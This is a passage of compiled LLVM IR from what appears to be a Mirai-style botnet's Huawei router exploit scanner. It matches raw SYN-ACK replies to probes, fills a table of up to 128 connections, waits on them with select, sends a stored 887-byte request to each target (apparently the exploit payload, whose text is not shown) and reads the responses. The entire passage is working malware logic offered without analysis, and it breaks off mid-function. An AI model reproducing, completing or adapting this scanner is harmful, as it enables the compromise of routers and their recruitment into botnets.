  %257 = icmp ne i32 %254, %256
  br i1 %257, label %258, label %259

; <label>:258:                                    ; preds = %250
  br label %206

; <label>:259:                                    ; preds = %250
  %260 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %261 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = load i16, i16* %2, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp ne i32 %263, %265
  br i1 %266, label %267, label %268

; <label>:267:                                    ; preds = %259
  br label %206

; <label>:268:                                    ; preds = %259
  %269 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = lshr i16 %271, 9
  %273 = and i16 %272, 1
  %274 = icmp ne i16 %273, 0
  br i1 %274, label %276, label %275

; <label>:275:                                    ; preds = %268
  br label %206

; <label>:276:                                    ; preds = %268
  %277 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %278 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = lshr i16 %279, 12
  %281 = and i16 %280, 1
  %282 = icmp ne i16 %281, 0
  br i1 %282, label %284, label %283

; <label>:283:                                    ; preds = %276
  br label %206

; <label>:284:                                    ; preds = %276
  %285 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %286 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 10
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  br i1 %290, label %291, label %292

; <label>:291:                                    ; preds = %284
  br label %206

; <label>:292:                                    ; preds = %284
  %293 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = lshr i16 %295, 8
  %297 = and i16 %296, 1
  %298 = icmp ne i16 %297, 0
  br i1 %298, label %299, label %300

; <label>:299:                                    ; preds = %292
  br label %206

; <label>:300:                                    ; preds = %292
  %301 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %302 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %301, i32 0, i32 3
  %303 = load i32, i32* %302, align 4
  %304 = call i32 @ntohl(i32 %303) #9
  %305 = sub i32 %304, 1
  %306 = call i32 @htonl(i32 %305) #9
  %307 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 8
  %309 = load i32, i32* %308, align 4
  %310 = icmp ne i32 %306, %309
  br i1 %310, label %311, label %312

; <label>:311:                                    ; preds = %300
  br label %206

; <label>:312:                                    ; preds = %300
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %313 = load i32, i32* %9, align 4
  store i32 %313, i32* %18, align 4
  br label %314

; <label>:314:                                    ; preds = %332, %312
  %315 = load i32, i32* %18, align 4
  %316 = icmp slt i32 %315, 128
  br i1 %316, label %317, label %335

; <label>:317:                                    ; preds = %314
  %318 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %318, i64 %320
  %322 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %321, i32 0, i32 2
  %323 = load i32, i32* %322, align 8
  %324 = icmp eq i32 %323, 0
  br i1 %324, label %325, label %331

; <label>:325:                                    ; preds = %317
  %326 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %327 = load i32, i32* %18, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %326, i64 %328
  store %struct.exploit_scanner_connection* %329, %struct.exploit_scanner_connection** %22, align 8
  %330 = load i32, i32* %18, align 4
  store i32 %330, i32* %9, align 4
  br label %335

; <label>:331:                                    ; preds = %317
  br label %332

; <label>:332:                                    ; preds = %331
  %333 = load i32, i32* %18, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %18, align 4
  br label %314

; <label>:335:                                    ; preds = %325, %314
  %336 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %337 = icmp eq %struct.exploit_scanner_connection* %336, null
  br i1 %337, label %338, label %339

; <label>:338:                                    ; preds = %335
  br label %351

; <label>:339:                                    ; preds = %335
  %340 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %343, i32 0, i32 3
  store i32 %342, i32* %344, align 4
  %345 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %346 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %345, i32 0, i32 0
  %347 = load i16, i16* %346, align 4
  %348 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %349 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %348, i32 0, i32 4
  store i16 %347, i16* %349, align 8
  %350 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %350)
  br label %206

; <label>:351:                                    ; preds = %338, %230
  br label %352

; <label>:352:                                    ; preds = %351
  %353 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %354 = getelementptr inbounds [16 x i64], [16 x i64]* %353, i64 0, i64 0
  %355 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %354) #6, !srcloc !3
  %356 = extractvalue { i64, i64* } %355, 0
  %357 = extractvalue { i64, i64* } %355, 1
  %358 = trunc i64 %356 to i32
  store i32 %358, i32* %24, align 4
  %359 = ptrtoint i64* %357 to i64
  %360 = trunc i64 %359 to i32
  store i32 %360, i32* %25, align 4
  br label %361

; <label>:361:                                    ; preds = %352
  br label %362

; <label>:362:                                    ; preds = %361
  %363 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %364 = getelementptr inbounds [16 x i64], [16 x i64]* %363, i64 0, i64 0
  %365 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %364) #6, !srcloc !4
  %366 = extractvalue { i64, i64* } %365, 0
  %367 = extractvalue { i64, i64* } %365, 1
  %368 = trunc i64 %366 to i32
  store i32 %368, i32* %26, align 4
  %369 = ptrtoint i64* %367 to i64
  %370 = trunc i64 %369 to i32
  store i32 %370, i32* %27, align 4
  br label %371

; <label>:371:                                    ; preds = %362
  store i32 0, i32* %1, align 4
  br label %372

; <label>:372:                                    ; preds = %478, %371
  %373 = load i32, i32* %1, align 4
  %374 = icmp slt i32 %373, 128
  br i1 %374, label %375, label %481

; <label>:375:                                    ; preds = %372
  store i32 5, i32* %28, align 4
  %376 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %377 = load i32, i32* %1, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %376, i64 %378
  store %struct.exploit_scanner_connection* %379, %struct.exploit_scanner_connection** %7, align 8
  %380 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %381 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %380, i32 0, i32 2
  %382 = load i32, i32* %381, align 8
  %383 = icmp ne i32 %382, 0
  br i1 %383, label %384, label %404

; <label>:384:                                    ; preds = %375
  %385 = load i32, i32* @huawei_fake_time, align 4
  %386 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %387 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %386, i32 0, i32 1
  %388 = load i32, i32* %387, align 4
  %389 = sub i32 %385, %388
  %390 = load i32, i32* %28, align 4
  %391 = icmp ugt i32 %389, %390
  br i1 %391, label %392, label %404

; <label>:392:                                    ; preds = %384
  %393 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %394 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %393, i32 0, i32 0
  %395 = load i32, i32* %394, align 8
  %396 = call i32 @close(i32 %395)
  %397 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %398 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %397, i32 0, i32 0
  store i32 -1, i32* %398, align 8
  %399 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %400 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %399, i32 0, i32 2
  store i32 0, i32* %400, align 8
  %401 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %402 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %401, i32 0, i32 6
  %403 = getelementptr inbounds [256 x i8], [256 x i8]* %402, i32 0, i32 0
  call void @util_zero(i8* %403, i32 256)
  br label %478

; <label>:404:                                    ; preds = %384, %375
  %405 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %405, i32 0, i32 2
  %407 = load i32, i32* %406, align 8
  %408 = icmp eq i32 %407, 1
  br i1 %408, label %419, label %409

; <label>:409:                                    ; preds = %404
  %410 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %411 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %410, i32 0, i32 2
  %412 = load i32, i32* %411, align 8
  %413 = icmp eq i32 %412, 3
  br i1 %413, label %419, label %414

; <label>:414:                                    ; preds = %409
  %415 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %416 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %415, i32 0, i32 2
  %417 = load i32, i32* %416, align 8
  %418 = icmp eq i32 %417, 4
  br i1 %418, label %419, label %445

; <label>:419:                                    ; preds = %414, %409, %404
  %420 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %421 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = srem i32 %422, 64
  %424 = zext i32 %423 to i64
  %425 = shl i64 1, %424
  %426 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %427 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %427, i32 0, i32 0
  %429 = load i32, i32* %428, align 8
  %430 = sdiv i32 %429, 64
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds [16 x i64], [16 x i64]* %426, i64 0, i64 %431
  %433 = load i64, i64* %432, align 8
  %434 = or i64 %433, %425
  store i64 %434, i64* %432, align 8
  %435 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %436 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 8
  %438 = load i32, i32* %12, align 4
  %439 = icmp sgt i32 %437, %438
  br i1 %439, label %440, label %444

; <label>:440:                                    ; preds = %419
  %441 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %442 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 8
  store i32 %443, i32* %12, align 4
  br label %444

; <label>:444:                                    ; preds = %440, %419
  br label %477

; <label>:445:                                    ; preds = %414
  %446 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %447 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %446, i32 0, i32 2
  %448 = load i32, i32* %447, align 8
  %449 = icmp ne i32 %448, 0
  br i1 %449, label %450, label %476

; <label>:450:                                    ; preds = %445
  %451 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %452 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 8
  %454 = srem i32 %453, 64
  %455 = zext i32 %454 to i64
  %456 = shl i64 1, %455
  %457 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %458 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %459 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 8
  %461 = sdiv i32 %460, 64
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds [16 x i64], [16 x i64]* %457, i64 0, i64 %462
  %464 = load i64, i64* %463, align 8
  %465 = or i64 %464, %456
  store i64 %465, i64* %463, align 8
  %466 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %467 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 8
  %469 = load i32, i32* %11, align 4
  %470 = icmp sgt i32 %468, %469
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %450
  %472 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %473 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %472, i32 0, i32 0
  %474 = load i32, i32* %473, align 8
  store i32 %474, i32* %11, align 4
  br label %475

; <label>:475:                                    ; preds = %471, %450
  br label %476

; <label>:476:                                    ; preds = %475, %445
  br label %477

; <label>:477:                                    ; preds = %476, %444
  br label %478

; <label>:478:                                    ; preds = %477, %392
  %479 = load i32, i32* %1, align 4
  %480 = add nsw i32 %479, 1
  store i32 %480, i32* %1, align 4
  br label %372

; <label>:481:                                    ; preds = %372
  %482 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %482, align 8
  %483 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %483, align 8
  %484 = load i32, i32* %12, align 4
  %485 = load i32, i32* %11, align 4
  %486 = icmp sgt i32 %484, %485
  br i1 %486, label %487, label %489

; <label>:487:                                    ; preds = %481
  %488 = load i32, i32* %12, align 4
  br label %491

; <label>:489:                                    ; preds = %481
  %490 = load i32, i32* %11, align 4
  br label %491

; <label>:491:                                    ; preds = %489, %487
  %492 = phi i32 [ %488, %487 ], [ %490, %489 ]
  %493 = add nsw i32 1, %492
  %494 = call i32 @select(i32 %493, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %494, i32* %13, align 4
  %495 = call i64 @time(i64* null) #6
  %496 = trunc i64 %495 to i32
  store i32 %496, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %497

; <label>:497:                                    ; preds = %715, %491
  %498 = load i32, i32* %1, align 4
  %499 = icmp slt i32 %498, 128
  br i1 %499, label %500, label %718

; <label>:500:                                    ; preds = %497
  %501 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %502 = load i32, i32* %1, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %501, i64 %503
  store %struct.exploit_scanner_connection* %504, %struct.exploit_scanner_connection** %7, align 8
  %505 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %506 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 8
  %508 = icmp eq i32 %507, -1
  br i1 %508, label %509, label %510

; <label>:509:                                    ; preds = %500
  br label %715

; <label>:510:                                    ; preds = %500
  %511 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %512 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %513 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %512, i32 0, i32 0
  %514 = load i32, i32* %513, align 8
  %515 = sdiv i32 %514, 64
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds [16 x i64], [16 x i64]* %511, i64 0, i64 %516
  %518 = load i64, i64* %517, align 8
  %519 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %520 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %519, i32 0, i32 0
  %521 = load i32, i32* %520, align 8
  %522 = srem i32 %521, 64
  %523 = zext i32 %522 to i64
  %524 = shl i64 1, %523
  %525 = and i64 %518, %524
  %526 = icmp ne i64 %525, 0
  br i1 %526, label %527, label %597

; <label>:527:                                    ; preds = %510
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %528 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %529 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 8
  %531 = bitcast i32* %29 to i8*
  %532 = call i32 @getsockopt(i32 %530, i32 1, i32 4, i8* %531, i32* %31) #6
  store i32 %532, i32* %30, align 4
  %533 = load i32, i32* %29, align 4
  %534 = icmp eq i32 %533, 0
  br i1 %534, label %535, label %587

; <label>:535:                                    ; preds = %527
  %536 = load i32, i32* %30, align 4
  %537 = icmp eq i32 %536, 0
  br i1 %537, label %538, label %587

; <label>:538:                                    ; preds = %535
  %539 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %540 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %539, i32 0, i32 2
  %541 = load i32, i32* %540, align 8
  %542 = icmp eq i32 %541, 3
  br i1 %542, label %543, label %568

; <label>:543:                                    ; preds = %538
  %544 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %545 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %544, i32 0, i32 8
  %546 = getelementptr inbounds [2560 x i8], [2560 x i8]* %545, i32 0, i32 0
  %547 = call i32 @util_strcpy(i8* %546, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i32 0, i32 0))
  %548 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %549 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %548, i32 0, i32 0
  %550 = load i32, i32* %549, align 8
  %551 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %552 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %551, i32 0, i32 8
  %553 = getelementptr inbounds [2560 x i8], [2560 x i8]* %552, i32 0, i32 0
  %554 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %555 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %554, i32 0, i32 8
  %556 = getelementptr inbounds [2560 x i8], [2560 x i8]* %555, i32 0, i32 0
  %557 = call i32 @util_strlen(i8* %556)
  %558 = sext i32 %557 to i64
  %559 = call i64 @send(i32 %550, i8* %553, i64 %558, i32 16384)
  %560 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %561 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %560, i32 0, i32 8
  %562 = getelementptr inbounds [2560 x i8], [2560 x i8]* %561, i32 0, i32 0
  call void @util_zero(i8* %562, i32 2560)
  %563 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %564 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %563, i32 0, i32 6
  %565 = getelementptr inbounds [256 x i8], [256 x i8]* %564, i32 0, i32 0
  call void @util_zero(i8* %565, i32 256)
  %566 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %566, i32 0, i32 2
  store i32 4, i32* %567, align 8
  br label %715

; <label>:568:                                    ; preds = %538
  %569 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %570 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %569, i32 0, i32 2
  %571 = load i32, i32* %570, align 8
  %572 = icmp eq i32 %571, 4
  br i1 %572, label %573, label %582

; <label>:573:                                    ; preds = %568
  %574 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %575 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %574, i32 0, i32 0
  %576 = load i32, i32* %575, align 8
  %577 = call i32 @close(i32 %576)
  %578 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %579 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %578, i32 0, i32 0
  store i32 -1, i32* %579, align 8
  %580 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %581 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %580, i32 0, i32 2
  store i32 0, i32* %581, align 8
  br label %715

; <label>:582:                                    ; preds = %568
  %583 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %584 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %583, i32 0, i32 2
  store i32 3, i32* %584, align 8
  br label %585

; <label>:585:                                    ; preds = %582
  br label %586

; <label>:586:                                    ; preds = %585
  br label %596

; <label>:587:                                    ; preds = %535, %527
  %588 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %589 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %588, i32 0, i32 0
  %590 = load i32, i32* %589, align 8
  %591 = call i32 @close(i32 %590)
  %592 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %593 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %592, i32 0, i32 0
  store i32 -1, i32* %593, align 8
  %594 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %595 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %594, i32 0, i32 2
  store i32 0, i32* %595, align 8
  br label %715

; <label>:596:                                    ; preds = %586
  br label %597

; <label>:597:                                    ; preds = %596, %510
  %598 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %599 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %600 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 8
  %602 = sdiv i32 %601, 64
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds [16 x i64], [16 x i64]* %598, i64 0, i64 %603
  %605 = load i64, i64* %604, align 8
  %606 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %607 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %606, i32 0, i32 0
  %608 = load i32, i32* %607, align 8
  %609 = srem i32 %608, 64
  %610 = zext i32 %609 to i64
  %611 = shl i64 1, %610
  %612 = and i64 %605, %611
  %613 = icmp ne i64 %612, 0
  br i1 %613, label %614, label %714

; <label>:614:                                    ; preds = %597
  br label %615

; <label>:615:                                    ; preds = %695, %676, %614
  store i32 0, i32* %32, align 4
  %616 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %617 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %616, i32 0, i32 2
  %618 = load i32, i32* %617, align 8
  %619 = icmp eq i32 %618, 0
  br i1 %619, label %620, label %621

; <label>:620:                                    ; preds = %615
  br label %713

; <label>:621:                                    ; preds = %615
  %622 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %623 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %622, i32 0, i32 5
  %624 = load i32, i32* %623, align 4
  %625 = icmp eq i32 %624, 256
  br i1 %625, label %626, label %638

; <label>:626:                                    ; preds = %621
  %627 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %628 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %627, i32 0, i32 6
  %629 = getelementptr inbounds [256 x i8], [256 x i8]* %628, i32 0, i32 0
  %630 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %631 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %630, i32 0, i32 6
  %632 = getelementptr inbounds [256 x i8], [256 x i8]* %631, i32 0, i32 0
  %633 = getelementptr inbounds i8, i8* %632, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %629, i8* %633, i64 192, i32 1, i1 false)
  %634 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %634, i32 0, i32 5
  %636 = load i32, i32* %635, align 4
  %637 = sub nsw i32 %636, 64
  store i32 %637, i32* %635, align 4
  br label %638

; <label>:638:                                    ; preds = %626, %621
  %639 = call i32* @__errno_location() #9
  store i32 0, i32* %639, align 4
  %640 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %641 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 8
  %643 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %644 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %643, i32 0, i32 6
  %645 = getelementptr inbounds [256 x i8], [256 x i8]* %644, i32 0, i32 0
  %646 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %646, i32 0, i32 5
  %648 = load i32, i32* %647, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds i8, i8* %645, i64 %649
  %651 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %652 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %651, i32 0, i32 5
  %653 = load i32, i32* %652, align 4
  %654 = sub nsw i32 256, %653
  %655 = call i32 @huawei_recv_strip_null(i32 %642, i8* %650, i32 %654, i32 16384)
  store i32 %655, i32* %32, align 4
  %656 = load i32, i32* %32, align 4
  %657 = icmp eq i32 %656, 0
  br i1 %657, label %658, label %660

; <label>:658:                                    ; preds = %638
  %659 = call i32* @__errno_location() #9
  store i32 104, i32* %659, align 4
  store i32 -1, i32* %32, align 4
  br label %660

; <label>:660:                                    ; preds = %658, %638
  %661 = load i32, i32* %32, align 4
  %662 = icmp eq i32 %661, -1
  br i1 %662, label %663, label %695

; <label>:663:                                    ; preds = %660
  %664 = call i32* @__errno_location() #9
  %665 = load i32, i32* %664, align 4
  %666 = icmp ne i32 %665, 11
  br i1 %666, label %667, label %694

; <label>:667:                                    ; preds = %663
  %668 = call i32* @__errno_location() #9
  %669 = load i32, i32* %668, align 4
  %670 = icmp ne i32 %669, 11
  br i1 %670, label %671, label %694

; <label>:671:                                    ; preds = %667
  %672 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %673 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %672, i32 0, i32 2
  %674 = load i32, i32* %673, align 8
  %675 = icmp eq i32 %674, 3
  br i1 %675, label %676, label %682

; <label>:676:                                    ; preds = %671
  %677 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %678 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 8
  %680 = call i32 @close(i32 %679)
  %681 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %681)
  br label %615

; <label>:682:                                    ; preds = %671
  %683 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %684 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 8
  %686 = call i32 @close(i32 %685)
